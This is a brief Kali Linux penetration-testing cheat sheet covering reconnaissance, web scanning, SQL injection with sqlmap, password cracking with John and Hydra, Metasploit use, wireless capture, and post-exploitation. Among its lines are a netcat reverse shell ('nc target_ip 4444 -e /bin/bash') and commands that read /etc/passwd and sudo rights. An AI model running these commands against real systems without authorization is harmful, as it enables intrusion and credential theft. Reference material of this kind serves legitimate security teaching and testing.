# 🛠️ Kali Linux Command Cheatsheet

## System Commands
pwd # Show current directory
ls -la # List all files
cd /path # Change directory
sudo su # Switch to root

text

## Network Reconnaissance
Nmap
nmap -sn 192.168.1.0/24 # Network discovery
nmap -sV target_ip # Service version detection
nmap -A -T4 target_ip # Aggressive scan

Ping
ping target_ip # Check if host is alive

Netstat
netstat -tuln # Show listening ports

text

## Web Application Testing
Nikto
nikto -h http://target_ip # Web server scan

Dirb/Gobuster
dirb http://target_ip # Directory brute force
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

SQLMap
sqlmap -u "http://target/page?id=1" --dbs # SQL injection

text

## Password Cracking
John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Hydra
hydra -l admin -P passwords.txt target_ip ssh

text

## Exploitation
Metasploit
msfconsole # Start Metasploit
search exploit_name # Search exploits
use exploit_path # Select exploit
show options # View required options
set RHOST target_ip # Set target
exploit # Run exploit

text

## Wireless
Aircrack-ng
airmon-ng start wlan0 # Enable monitor mode
airodump-ng wlan0mon # Capture packets

text

## Post-Exploitation
Netcat reverse shell
nc -lvnp 4444 # Listener
nc target_ip 4444 -e /bin/bash # Connect back

text

## File Operations
find / -name "*.conf" 2>/dev/null # Find config files
cat /etc/passwd # View users
sudo -l # Check sudo privileges

text
undefined
